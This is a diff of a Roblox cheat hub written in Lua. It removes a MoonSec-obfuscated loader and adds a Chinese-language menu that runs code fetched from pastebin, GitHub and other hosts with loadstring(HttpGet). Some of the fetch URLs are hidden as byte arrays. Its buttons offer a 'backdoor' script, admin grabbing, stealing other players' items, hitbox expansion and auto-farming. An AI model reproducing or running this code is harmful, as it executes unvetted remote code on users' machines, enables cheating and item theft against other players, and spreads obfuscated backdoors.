@@ -1,1 +1,453 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _QKZpUVbZxiPR = a; end)); return(function(_,...)local d;local r;local u;local t;local l;local a;local e=24915;local o=0;local n={};while o<494 do o=o+1;while o<0x2b3 and e%0x25da<0x12ed do o=o+1 e=(e-388)%44171 local j=o+e if(e%0x28bc)<=0x145e then e=(e+0x41)%0x5143 while o<0x2da and e%0x1c82<0xe41 do o=o+1 e=(e*956)%40436 local u=o+e if(e%0x3bd0)<=0x1de8 then e=(e-0x1cd)%0x93b5 local e=19572 if not n[e]then n[e]=0x1 l=string;end elseif e%2~=0 then e=(e+0x223)%0x9366 local e=80113 if not n[e]then n[e]=0x1 end else e=(e-0x1f7)%0x736b o=o+1 local e=57129 if not n[e]then n[e]=0x1 d=getfenv and getfenv();end end end elseif e%2~=0 then e=(e-0x20c)%0xbfae while o<0x181 and e%0x250e<0x1287 do o=o+1 e=(e*995)%19101 local u=o+e if(e%0x844)<0x422 then e=(e*0x1a0)%0x7e9b local e=81433 if not n[e]then n[e]=0x1 r=tonumber;end elseif e%2~=0 then e=(e*0x291)%0x24f0 local e=26981 if not n[e]then n[e]=0x1 d=(not d)and _ENV or d;end else e=(e-0x2fe)%0x5ed5 o=o+1 local e=86938 if not n[e]then n[e]=0x1 end end end else e=(e+0x319)%0x5b4a o=o+1 while o<0x19a and e%0x864<0x432 do o=o+1 e=(e-168)%5740 local j=o+e if(e%0x23b2)>=0x11d9 then e=(e*0x2de)%0x6706 local e=52933 if not n[e]then n[e]=0x1 t="\4\8\116\111\110\117\109\98\101\114\71\67\87\86\118\88\121\116\0\6\115\116\114\105\110\103\4\99\104\97\114\103\70\73\111\95\99\118\68\0\6\115\116\114\105\110\103\3\115\117\98\87\120\75\110\119\103\86\106\0\6\115\116\114\105\110\103\4\98\121\116\101\120\73\116\101\105\113\85\74\0\5\116\97\98\108\101\6\99\111\110\99\97\116\89\83\112\100\122\67\71\73\0\5\116\97\98\108\101\6\105\110\115\101\114\116\89\122\86\74\115\115\108\66\5";end elseif e%2~=0 then e=(e+0x324)%0x7f7f local e=84501 if not n[e]then n[e]=0x1 a={};end else e=(e-0x179)%0x7ccb o=o+1 local e=71068 if not n[e]then n[e]=0x1 u=function(n)local e=0x01 local function o(o)e=e+o return n:sub(e-o,e-0x01)end while true do local n=o(0x01)if(n=="\5")then break end local e=l.byte(o(0x01))local e=o(e)if n=="\2"then e=a.GCWVvXyt(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then d[e]=function(o,e)return _(8,nil,_,e,o)end elseif n=="\4"then e=d[e]elseif n=="\0"then e=d[e][o(l.byte(o(0x01)))];end local o=o(0x08)a[o]=e end end end end end end end e=(e+1001)%40081 end u(t);local o={};for e=0x0,0xff do local n=a.gFIo_cvD(e);o[e]=n;o[n]=e;end local function j(e)return o[e];end local l=(function(_,l)local t,n=0x01,0x10 local o={{},{},{}}local d=-0x01 local e=0x01 local u=_ while true do o[0x03][a.WxKnwgVj(l,e,(function()e=t+e return e-0x01 end)())]=(function()d=d+0x01 return d end)()if d==(0x0f)then d=""n=0x000 break end end local d=#l while e<d+0x01 do o[0x02][n]=a.WxKnwgVj(l,e,(function()e=t+e return e-0x01 end)())n=n+0x01 if n%0x02==0x00 then n=0x00 a.YzVJsslB(o[0x01],(j((((o[0x03][o[0x02][0x00]]or 0x00)*0x10)+(o[0x03][o[0x02][0x01]]or 0x00)+u)%0x100)));u=_+u;end end return a.YSpdzCGI(o[0x01])end);u(l(68,"c=S1;%5gIj_x6-pG6="));u(l(211,"90.Czhx) vl+k*&M.*xyMl. hC))lvkMvv.xxz v+v+MMhC0z )ull*&uv&.0jl k MC.+h h&+h&l0CC)zxvxk  .+Cz+)lv&*j:C.kCM + *& *MC x).zh)M00Mzlx&lGkxv0.xz) )lC*ho+Ckxq &+v*z..0lj.CCkv&l.lz+0hlvk&MkCkx0)) M+M&M.)z&l0*0 l+MhC).l&*zMvChzM Mlv*)Y&Czx v0+k*.00h0 .lJx v 0zhd)++v&000MMhC &khkz0*h0)hvhxhv.C.zv)&+x&0*&C+Ck MlM&&0**vYhxlkk*M#vh&h++C*x&0klM+vz+k&*0+zxxlvkk.*)M&zxh}lx+*&aSzM#..+&* <xC*xCC0k*MC..z>xMlzl+RkCxhhh+vz&.& *./0v*kCM.0_CM)z f*v&.0)zz 0  kzl.*Ex v)++&*.F0M)Mll+v{x..Ck &zh)z8&.*x0 )+.Mm0zzMzh c+kM&0Mh 00z.* MvCvhl.z+.&h0hz.). u+zM*.vz.h}vC*Cvl"));local e=(-3676+(function()local d,o=0,1;(function(n,o,e)o(e(e,o and o,n)and o(n,e,e),e(e and n,n,n),e(o,e,o and o))end)(function(u,n,e)if d>146 then return u end d=d+1 o=(o-18)%32342 if(o%1290)>=645 then o=(o*515)%29274 return n else return e(e(u,e,e),e(n,n,u)and u(n and e,n and e,e and e),n(e and n,e,n))end return n(e(n and n,e,u),e(u,u and e,n),u(e,e,e))end,function(e,n,u)if d>460 then return u end d=d+1 o=(o*141)%17821 if(o%1620)>810 then o=(o-761)%22273 return e(u(n,n,e),e(e,e,n),n(n,e,u))else return e end return e end,function(n,u,e)if d>381 then return e end d=d+1 o=(o-399)%13320 if(o%1526)<763 then return u else return n(n(e,e,u and n),n(e,u,e),e(e,u,n))end return n(e(e,n,n),u(e,n,u),u(e,n,e and e))end)return o;end)())local j=a.JvRZZjDS or a.EyvhAMnG;local ue=(getfenv)or(function()return _ENV end);local y=1;local u=3;local d=2;local t=4;local function de(k,...)local h=l(e,"bHI9OjVu{XRPo_ FX9j{{OPm__Ho9OV({oR4VOXHIH:oIRRVu _7IPH 9_Piu{PR9IHOj;OI9IIXV9{nRo_{ P_VHuV_u!VzFI_OFHujOV{XFX_XHOXXo_F*HoO{P_a O*VRX9RO HIsO{-H9Ij{{OP}I9VXRHoj_jHo j9u9oV{XOHOjO{HPuX2tI9HV+{jVo F%jO9HoX{oV FI,9_VuROoH o_OjuujRoooPywXju{9R PFF_IuH.uIuPujPjooF{IO9{}9jIPXR oV9o9_9XoHRo {OX-FVYoXPO 9O_OOOF _HFOOu4XoIPV9{ PR__,uOOF_9IjO{zRoPFX{_{OIHnVPojXoojX XHo? {HOOnPRFX9HjjH_jOuORAoo__PO_ Vj9Fuo {P#FIVROo{{QXOXVJ{oP{oRP_FujHIuOH_O_j ojV9{uI_PPFFHVcI{VR IoOq={Ho9_{#O9!OI9jVFoXXFPXOoO_VO9oVoIX oH{R{RoR_97F{9RPIXO_JjHuFR{_OC#HI FIOPH Vd{9OVA_XHXOFujX9_HnIIOjP{FOjuPXoo{FOV{Pj_okXI(V {_oH XIHOjYj9Vjo{{POoX{o_IOPIOVO XHPO)VoX{HOjou_oH_XHI9FFPIOjwuoR{_O-pOCX{{jPo_o8{9OR9FPIVORuXR9R 59Iojpu_PVuHRHo{FOI?Po R>_9 uQIXVV{aRo_{ { _F{u.9OVjj_{XXuoXFHHFOuu9RIoPFXIeH_j{uOR>ooVH{{Pj RHo9_VVRjP_FoHj9Fu_R{oFF PXF9Hl9oV{uoO R9F__9mV{9uVXjcu_oF {XVHXOIXVd{ARo_{ Ro{HRVFj{XRFIoFHRuXj9XoHjOXVoX{oO9H{4RoPVHjO>VoX9P u_P9_O*iIoR{FVHjOXuHRXo__PIVj7{X9_VFXOoG ojoRX_VF_9_VhXOO_XjRO_;FoU_ O9{X}XIP j{OZOM9OojP_P{OXHFVV_LXuF_jHI{uo_O_Oo{jROoV_IHIjjouoR{_O uR_>_V_j_j  _PPHRu9VIuHHHj_V{XOo}_OPF ujX9hOX_R_{+Oj IojF jR{  V{O_VO o_F__uuuCV{FI _ Fu{VPu_/9FoFjXXoRFQHoO{jRI9jH_o_  Hu_oX_Of}Io9_Oq9:oHX{ 9OuHRVHoXP FIjkj9jP_HXFF jV9{jj_XRR _j_9_u{ IPu OVuj^XISj9ujo{{PO99uHRoRuFFI O_HjjjVoX{oO_VoXE9j_99O_ : HF{VOIFu  jPV4rVX9{X9 _oHHu{_oR OH29oj<OPu9_OoFoujXOuVt_X_RFIVmjI{  9 j>I{H_h_{AO9qOjI5u9ojPoooOX9 jjo RR FjIOPVo_jRH _jX9XuO__P9FFVOIPXH uo)6MV{V{VX o   V{__( OHh9oO_OIuF_IRXo j{I9uI_XRRFOj_Io{u HPj+OVX9 uV RooHV{XoR (2o9{PuFHIRjPjoXjR u uHRPhj_PFj{{{XRATo_OHV{ u&RoI_j {OPD_oFH_uF uOjXu*HHOVV{XOod9FuXPR_j_F9uVI{VPj_FRj_PFoI{jOooHP9PVjXoRoFOHjjXuHRRVjXuPo {HO{{ r%o9O9u{HPoujoHooF{IOP{F}HoOOu9VV{uP9I,9_uPR{oj  IHjI9 XF_uaH Fj uXPPXF,jI/9PV Pj__ jORF_OOjO{0RoPooHooOOW{9XjIuPXR_MFF9OD{u_RORVoXFjIOjHuXR{+oOVV9{_Po {RX 9aWIoj{VRj_XuFHou HuOuj{oFX_F,VuoVHu{HXOXu;Xoo{O{{Xo8 OYX_HHHI{jO{!XI{RX_H{ SIIXRuoP{H HXHPROXuRXIuFjIiFOH jHOX{XRrooF{fRF_9uXHVu{HHOHjIoXjVVRuHo 9OXX {MXYIH<oI oHFVH{OOuGy{9ujj{OPF oHV9XVR{Fjj{ Ro_{aOHVF{HjXXVRR_H_F_9{R9{IX{{XPJXX_HFcHoO{_9FHHujIXORj_InRI u{XjR{_VPH  4{9OV-uIjOVOFj oFuuoVuuIkHoPF {OuVPIqucXIVRj_oFoI{jOVOVPjo { RBHVou9VOFH F&IXH_H {HOO7jIOjuF_XRFoXjoj_uO_ P{2PVjI{u9 {P5FIVROo{{pXOVV7{oP{oPPuFuO_H V{_jX{ 9jjjVV _oo BRjFVHu F_9 jO{;RoP PVoXOOQoO oVR{ OOROjOu_Ko9_jj9IHOoIfORu_XORH_{F{IOjZVjIFVH jPVF9Voj XR FFHx {_oI OHk9oRXF{IOO*u_Po OF 9uVoIHjlu{RO_6Oj{Po9  R_ ;WO9rjooPHjOou{XRojF9Iu XH OmVoX{RRR9oOI_FXOjPHXHoo{Ru_PV_OnzIoPGojXOXP{oH{HR9HXoR9XOIHHF9IoHF9H{OOuC XIXjF{jR#_XfV_HHjI{jO{eFXOuu9X RF _Hu9FjFRo_VFXIROF{u{{_jFoI{jj{R{X {HO9 FX9PjNuoR{OVVIROPXFuI9OHuoX_oOoV uH9Ouu9XPo{FEIIjtuuRIo_oX)DImOou{{_VOu_!_SIHRXOuF{RH{J9HRPjFPwo9{VOuVVXR9F__9 _{.{HX{yI_HFF{jjVR1Y__WHV{_jXP9HO_oH XVu{PO9jVX{oP{ OFV_91{u_jXuo}MFPI9X_o FOItOoVHIPj_ H O_O{HP{_{8O9KOHO(jPouXRPFORI{uRoFP{FRV_RjoOF+HoXo_XH{Ok9o{_o9__H{OOVj{_oR{j_O_oB{9OOV9XjPoXRo OO_H Vy_O_jiHjFj{ja_XRF_Xj 9!jI IoOm VjV9{R X o_oV_OO{FFPFO _XHoP {HOOvjHIujH_VR{oRjR9o{V__ s_&VH9{{9THO_j{{OPgOOuoR{_:FFFIH99FRooXau9OjHuRR__ oRIPV9{_uP REjOuIPVHPRoVIH2o9uuVRI{XP  <Lo9{RPFj9l9PuXPI IBHIujjH_OouOR.ooOo{Xo{F3RX XkwIoj{VROFVo  _9F>uO9ou FV_{HOuXOjuX.sF{IX{9jHuoIHjju{RO_M 9 I,9VuV{uj Xo? O{XP{ tSo9{oPFHIXO_HjOHVoX{oOH*H_j{uOR?ooOP{XP  <FVO9uOXjP  _H99_uoX_oFFRPXFXHe9oV{u_OuuXF _RIc{HjIXOij_HH_{RVo{Xz__ IHXHuHRo9HVR{{PO *j_HFII9O _H{OVuVRjoRF{IXOo{qujPjooF{IO9VIXV9P_X9R_O!OHj{I jH{IRu DFXooXO_VO 9vVo _IHOOuUXoPiXVoP9jFX9PPjP{RPjjXPRo_{TOH{F 99X_VHR9H_ICH9RIXRo_IuHR9XRR{vo{9B999lPOuoP 9VH{jO_jH{Ioj{{OXjj_PFHX {9uXoX oRI9FH9_RjuFXXIRFPjPPHujP99HF_jP_HHHI{jO{GXI{jPFHX FfXXoX_POH_F9OVRHXjROI{Fq9IRR{oo{O{ujR9ooF{IOj(uoR{ OOiI_VR{OPv_o  _3 guHjo{PF{ 9  u_OuuRvxFII {9{jRIIHjuu{RO_^jIXHoVFOIH9XuQ{joF _IV HHV9{VOXADFjoujPI }F_9V9uXHPHujPjooF{IO9{FoIXPXROoI9 HVV{o9PV_jO{HnjIoRRo {_RojFj _OOOOulXoPnRIoX9OI_jOP{P9_u9XHI9{odPP 9OO9F9uojXP_AOXH_j_H?FX FIju_OoXPexLII {Vu XXyXm_I_{_Vu{_jjjXX9P=_oA{HoHVHHX_X_oFIOMFIVR{XR_VIPI_ORo{FOIHjHu{RO_QOj{ooN jHh_Xho9Qjo{{F{jju XX_{FXIPjVHjOoVoX{oO9H{SRooOfH9 jX{PoI__H{9o^H9jj{{OP#oIPj FOXHF9Xooo_ OVXXOoM oH{OjuoXoo{FO^V RFX{_jaXP>  P,PXOXjPEoxj_{{PO hRO9{VOX:P_ {HOO/u RVoOFAHo{{uOR/oolR9FjiuoR{6u2LIoj{RRoV_ov{9OVV{oPX OHj9oVo _o< oH{ORuDX_o{F{uXOou{RO_uFoIXjO{DoR_{%O9Kj_{{PO vH RXVOXDPoHXHOO,VoRR HFMH_O{o9RQooF{OOjOuoRX_OeHIo{I{OoI Pe{9uV;_VP{ OHG9ou{XOoH oHPOOuNXoo{sOI!Oou{RO_JF I{jO{{Ro_{hO9Hjo{XPOFIIV9{VOX/yP {HOO}{oj_oOFwHoO{uO Poo<RVVjQu R{9H3;Ioj{{OoI_o#{9OVI{oPR O9tjOV{XOoQ oH{VjutR  jFOIIOooXRO_lFoI{V_{#RF_{tO9zjF{{ OFPqo9PVOP Po9VHOugu_X{ouF<V{O{oIRtFo IIOj9uo<P_OjRIoj{O Pf_o0{9uV%{_P{FVHH9oV{XO>F oH{OOX7R(o{FOI(Oou{ F_38 9PjO{IRo9j#O9Tjo{{_H U^o9{VVX^P  {9OjjVoXXoOFtHoVXuOPI_IF{Iuj2o_R{_OmBIoR9{OPO_of{9OV9{o {9VHYOvV{oIoMHPH{uOuuXoooFOVoOoo+ROlk>FI{j{{k&F_{HV9yjo{RPO HLo9oVOXHPoFRI2O&V_X{_{FzHoO{{VPRooFRIOXXuoR{_OaE9Pj{{jPy_ 7{9jViX IX OHH9oPuXOo( o9{jPuZX_o{FjIpXuu{PV_PFoIPjO_oRo_{.O9%VI{{Pj g.F9{VVXBo FPHOOIVo uoOFTHoV{XHRwo F{IVj;ouR{ Vs_Iojo{OoH_oN{9OVAXjP{ VHSONV{XVoYSoOXOOuIXooRFOOXOoX{_V_pF I{jV{UC _{IOOHjo{RPO Ito9FVOXVu{ {H{OLuPX{ojF1H_O{uOV{ooF{IOjHuoR{_O=GPjj{{VP- Mw{9jVcX _9 OHI9oXXXOok oIRjju;XFo{O9I>Oou{oO HFoIPjO{9RoiI-OOIV_{{PX C9u9{VOXhPoFVHOO9VoX_oOFWHoO{uVR>o F{IOjWu R{_OHjIojR{OPH_ogR9O{DHPP{ uHn9 V{RIo7 oIIOOujXoo{FOIjOoR{P _&*HI{j_{=_P_{9Ojvjo{_PO FroXXVOoN_9 {HXO)XOX{H_F*OojHuORjooFPIOuFuo_{ j,G9Hj{XuPJSP7{9OuX{oPP OHj9oVRXO yuPH{O{u6XFo{99ItOoXORO_VFoI{jO{9Ron{Ho9pVI{{P_ YHX9{XOo_Po  HOuPVo_XoOI7IjO{uRR} VF{{jj0uoPX_OvOIoj {OPI_oI{O VWXHP{ {H+R.V{RV_V oHFOOR{Xoo{FOIvVuu{RX_2N9I{jj{%oo_oiO9jjo{oPOOO3oORVPX%o9 {9{OnVoX{oOFFHoO_uORuooFXIOui{HR{_X:!9Qj{ {PU  Q{9OVu{o O OHK9oV{FIocFHH{OPu2X_o{HO jOou_RO_OFo{ojOXIos_{
+loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))()
+
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "纯缝合"; Text ="纯缝合"; Duration = 4; })
+
+local CoreGui = game:GetService("StarterGui")
+
+CoreGui:SetCore("SendNotification", {
+    Title = "沙脚本测试版0.5",
+    Text = "正在加载（反挂机已开启）",
+    Duration = 5, 
+})
+print("反挂机开启")
+		local vu = game:GetService("VirtualUser")
+		game:GetService("Players").LocalPlayer.Idled:connect(function()
+		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		   wait(1)
+		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		end)
+local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/iXGNieAz'))()
+local Window = OrionLib:MakeWindow({Name ="沙脚本测试版0.5", HidePremium = false, SaveConfig = true,IntroText = "沙脚本测试版0.5", ConfigFolder = "沙脚本测试版0.5"})
+
+local Tab = Window:MakeTab({
+    Name = "无",
+    Icon = "rbxassetid://7734068321",
+    PremiumOnly = false
+})
+
+Tab:AddParagraph("沙脚本测试版0.5 ")
+Tab:AddParagraph("阿尔宙斯注入器可能用不了")
+Tab:AddParagraph("作者roblox id:114514lzkill")
+Tab:AddParagraph("作者QQ3957336350")
+Tab:AddParagraph("Q群1026924908")
+
+local Tab = Window:MakeTab({
+	Name = "通用",
+	Icon = "rbxassetid://7734068321",
+	PremiumOnly = false
+})
+
+Tab:AddParagraph("用户名:"," "..game.Players.LocalPlayer.Name.."")
+Tab:AddParagraph("注入器:"," "..identifyexecutor().."")
+Tab:AddParagraph("服务器的ID"," "..game.GameId.."")
+
+Tab:AddButton({
+	Name = "开启玩家进出服务器提示",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
+  	end
+})
+
+Tab:AddTextbox({
+	Name = "跳跃高度设置",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+	end
+})
+
+Tab:AddTextbox({
+	Name = "移动速度设置",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end
+})
+
+Tab:AddTextbox({
+	Name = "自定义头部大小",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)		game:GetService('RunService').RenderStepped:connect(function()
+if _G.Disabled then
+for i,v in next, game:GetService('Players'):GetPlayers() do
+if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+pcall(function()
+v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
+v.Character.Head.Transparency = 1
+v.Character.Head.BrickColor = BrickColor.new("Red")
+v.Character.Head.Material = "Neon"
+v.Character.Head.CanCollide = false
+v.Character.Head.Massless = true
+end)
+end
+end
+end
+end)    
+	end
+})
+
+Tab:AddTextbox({
+	Name = "重力设置",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		game.Workspace.Gravity = Value
+	end
+})
+
+Tab:AddTextbox({
+	Name = "超广角设置",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		Workspace.CurrentCamera.FieldOfView = Value
+	end
+})
+
+Tab:AddTextbox({
+	Name = "最大视野设置",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		Workspace.CurrentCamera.FieldOfView = Value
+	end
+})
+
+Tab:AddTextbox({
+	Name = "最小视野设置",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		game.Workspace.CurrentCamera.FieldOfView = v
+	end
+})
+
+Tab:AddButton({
+  Name = "重新加入服务器",
+  Callback = function()
+game:GetService("TeleportService"):TeleportToPlaceInstance(
+            game.PlaceId,
+            game.JobId,
+            game:GetService("Players").LocalPlayer
+        )
+  end
+})
+
+Tab:AddButton({
+  Name = "离开服务器",
+  Callback = function()
+     game:Shutdown()
+  end
+})
+
+Tab:AddButton({
+  Name = "帧率显示",
+  Callback = function()
+ -- Gui to Lua 
+ -- Version: 3.2 
+  
+ -- Instances:
+ local ScreenGui = Instance.new("ScreenGui") 
+ local FpsLabel = Instance.new("TextLabel")
+ 
+ --Properties:
+ 
+ ScreenGui.Name = "FPSGui" 
+ ScreenGui.ResetOnSpawn = false 
+ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
+ 
+ FpsLabel.Name = "FPSLabel" 
+ FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
+ FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
+ FpsLabel.BackgroundTransparency = 1 
+ FpsLabel.Font = Enum.Font.SourceSansBold 
+ FpsLabel.Text = "帧率: 0" 
+ FpsLabel.TextSize = 20 
+ FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
+ FpsLabel.Parent = ScreenGui 
+  
+ function updateFpsLabel() 
+     local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
+     FpsLabel.Text = "帧率: " .. fps 
+ end 
+  
+  game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
+  
+ ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+
+ animateCredits()
+  end
+})
+
+Tab:AddButton({
+  Name = "显示时间",
+  Callback = function()
+local LBLG = Instance.new("ScreenGui", getParent)
+local LBL = Instance.new("TextLabel", getParent)
+local player = game.Players.LocalPlayer
+
+LBLG.Name = "LBLG"
+LBLG.Parent = game.CoreGui
+LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LBLG.Enabled = true
+LBL.Name = "LBL"
+LBL.Parent = LBLG
+LBL.BackgroundColor3 = Color3.new(1, 1, 1)
+LBL.BackgroundTransparency = 1
+LBL.BorderColor3 = Color3.new(0, 0, 0)
+LBL.Position = UDim2.new(0.75,0,0.010,0)
+LBL.Size = UDim2.new(0, 133, 0, 30)
+LBL.Font = Enum.Font.GothamSemibold
+LBL.Text = "TextLabel"
+LBL.TextColor3 = Color3.new(1, 1, 1)
+LBL.TextScaled = true
+LBL.TextSize = 14
+LBL.TextWrapped = true
+LBL.Visible = true
+
+local FpsLabel = LBL
+local Heartbeat = game:GetService("RunService").Heartbeat
+local LastIteration, Start
+local FrameUpdateTable = { }
+
+local function HeartbeatUpdate()
+	LastIteration = tick()
+	for Index = #FrameUpdateTable, 1, -1 do
+		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+	end
+	FrameUpdateTable[1] = LastIteration
+	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
+	CurrentFPS = CurrentFPS - CurrentFPS % 1
+	FpsLabel.Text = ("北京时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S")).."秒"
+end
+Start = tick()
+Heartbeat:Connect(HeartbeatUpdate)
+  end
+})
+
+
+Tab:AddButton({
+  Name = "重开",
+  Callback = function()
+
+game.Players.LocalPlayer.Character.Head:Remove()
+
+  end
+})
+
+Tab:AddButton({
+  Name = "飞行",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/114514lzkill/-/refs/heads/main/%E9%A3%9E%E8%A1%8C%E8%84%9A%E6%9C%AC.lua"))()
+
+   end
+})
+      
+Tab:AddButton({
+  Name = "后门脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "偷别人物品拿道具",
+  Callback = function()
+    --Copy And Paste:
+for i,v in pairs (game.Players:GetChildren()) do
+wait()
+for i,b in pairs (v.Backpack:GetChildren()) do
+b.Parent = game.Players.LocalPlayer.Backpack
+end
+end
+  end
+})
+
+Tab:AddButton({
+  Name = "解锁游戏通行证（测试）",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/LX318/LX/main/%E8%A7%A3%E9%94%81%E6%B8%B8%E6%88%8F%E9%80%9A%E8%A1%8C%E8%AF%81%202.lua"))()
+  end
+})
+Tab:AddButton({
+  Name = "老外撸管脚本r15",
+  Callback = function()
+  loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+  end
+})
+
+Tab:AddButton({
+  Name = "老外撸管脚本r6",
+  Callback = function()
+  loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+  end
+})
+Tab:AddButton({
+  Name = "吸人(一局只能吸一次)",
+  Callback = function()
+loadstring(game:HttpGet('https://pastebin.com/raw/PVPFXqtH'))()
+  end
+})
+
+Tab:AddButton({
+  Name = "获取管理员",
+  Callback = function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
+  end
+})
+
+Tab:AddButton({
+  Name = "极速旋转",
+  Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/ckiGL34v"))()
+  end
+})
+
+Tab:AddButton({
+  Name = "锁定视角",
+  Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/gdLR5Z7X"))()
+  end
+})
+
+Tab:AddButton({
+	Name = "无限跳",
+	Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
+end
+})
+
+Tab:AddButton({
+  Name = "灵魂出窍",
+  Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/ahK5jRxM"))()
+  end
+})
+Tab:AddButton({
+  Name = "让走路和跳跃变卡(对别人没影响)",
+  Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Fe%20Fake%20Lag%20Obfuscator'))()
+  end
+})
+
+local Tab = Window:MakeTab({
+	Name = "死铁轨",
+	Icon = "rbxassetid://7734068321",
+	PremiumOnly = false
+})
+Tab:AddButton({
+  Name = "死铁轨攻速脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/HeadHarse/DeadRails/refs/heads/main/V4SWING"))()
+    end
+})
+Tab:AddButton({
+  Name = "死铁轨未知脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://rawscripts.net/raw/Dead-Rails-Alpha-Auto-Win-Script-for-Dead-Rails-Instant-win-AFK-farm-KEYLESS-39867"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "SansHUB死铁轨脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/iopjklbnmsss/SansHubScript/refs/heads/main/SansHub"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "死铁轨飞行",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/AmareScripts/DeadRails/refs/heads/main/FlyV2%25viaTurret.lua"))()
+    end
+})
+Tab:AddButton({
+  Name = "死铁轨功能最多",
+  Callback = function()
+  loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "死铁轨叶子脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://getnative.cc/script/loader"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "死铁轨TX退休脚本",
+  Callback = function()
+  TX = "退休脚本"QUN = "160369111"loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\54\52\68\99\116\76\77\53\47\114\97\119"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "死铁轨RINGTA脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/DEADRAILSOP.github.io/refs/heads/main/ringta.lua"))()
+    end
+})
+Tab:AddButton({
+  Name = "死铁轨自动刷卷",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/thiennrb7/Script/refs/heads/main/autobond"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "死铁轨手动通关脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/TwoGunVolley/Dedrail/refs/heads/main/Protected_8860927939362090.txt"))()
+    end
+})
+  
+local Tab = Window:MakeTab({
+	Name = "俄亥俄州",
+	Icon = "rbxassetid://7734068321",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+  Name = "XA俄亥俄州",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/Ohio"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "宿摊自动刷印钞机",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sukuna2134/sukunascriptfree/refs/heads/main/%E5%AE%BF%E5%82%A9%E4%BF%84%E4%BA%A5%E4%BF%84%E5%B7%9E%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%9C%8D%E6%8C%82%E6%9C%BA.lua"))()
+    end
+})
+
+local Tab = Window:MakeTab({
+	Name = "被遗弃",
+	Icon = "rbxassetid://7734068321",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+  Name = "情云",
+  Callback = function()
+  loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
+    end
+})
+
+Tab:AddButton({
+  Name = "某某脚本免费版",
+  Callback = function()
+   loadstring(game:HttpGet"https://raw.githubusercontent.com/OWOWOWWOW/HTT/main/HT.lua")()
+     end
+})
+
